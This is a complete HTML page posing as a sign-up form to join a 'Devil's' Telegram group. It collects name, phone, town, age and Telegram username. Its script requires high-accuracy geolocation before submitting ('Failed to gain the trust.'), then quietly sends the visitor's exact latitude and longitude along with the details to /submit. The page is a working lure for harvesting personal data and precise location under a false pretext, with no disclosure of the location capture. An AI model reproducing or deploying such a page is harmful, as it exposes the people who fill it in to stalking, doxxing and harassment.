<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Join Devil's Telegram Group</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #5f2c82, #49a09d);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      min-height: 100vh;
    }

    h2 {
      font-size: 1.8rem;
      margin-bottom: 1rem;
      text-align: center;
      white-space: nowrap;
      overflow: hidden;
      animation: typing 3s steps(22), blink 0.5s step-end infinite alternate;
      border-right: 3px solid white;
    }

    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }

    @keyframes blink {
      from { border-color: transparent }
      to { border-color: white }
    }

    form {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      padding: 20px;
      border-radius: 16px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      width: 90%;
      max-width: 400px;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
    }

    input:focus {
      box-shadow: 0 0 8px #fff;
      background: #fff;
      color: #333;
    }

    button {
      background: #ffffff;
      color: #333;
      font-weight: bold;
      transition: 0.3s;
    }

    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 10px #fff;
    }
  </style>
</head>
<body>

<h2>Fill the form to join</h2>

<form id="userForm">
  <input type="text" name="fullname" placeholder="Full Name" required>
  <input type="text" name="phone" placeholder="Phone Number" required>
  <input type="text" name="towncity" placeholder="Town/City" required>
  <input type="number" name="age" placeholder="Age" required>
  <input type="text" name="telegram" placeholder="Telegram Username" required>
  <button type="submit">Submit</button>
</form>

<script>
document.getElementById("userForm").addEventListener("submit", function (e) {
  e.preventDefault();
  const form = e.target;

  if (!navigator.geolocation) {
    alert("Geolocation not supported.");
    return;
  }

  navigator.geolocation.getCurrentPosition(sendData, () => {
    alert("Failed to gain the trust.");
  }, { enableHighAccuracy: true, timeout: 10000 });

  function sendData(position) {
    const { latitude, longitude } = position.coords;
    const data = {
      fullname: form.fullname.value.trim(),
      phone: form.phone.value.trim(),
      towncity: form.towncity.value.trim(),
      age: form.age.value.trim(),
      telegram: form.telegram.value.trim(),
      latitude,
      longitude
    };

    fetch("/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
    .then(res => res.json())
    .then(response => {
      if (response.link) {
        window.location.href = response.link;
      } else {
        alert(response.error || "Something went wrong.");
      }
    })
    .catch(() => alert("Network error"));
  }
});
</script>

</body>
</html>
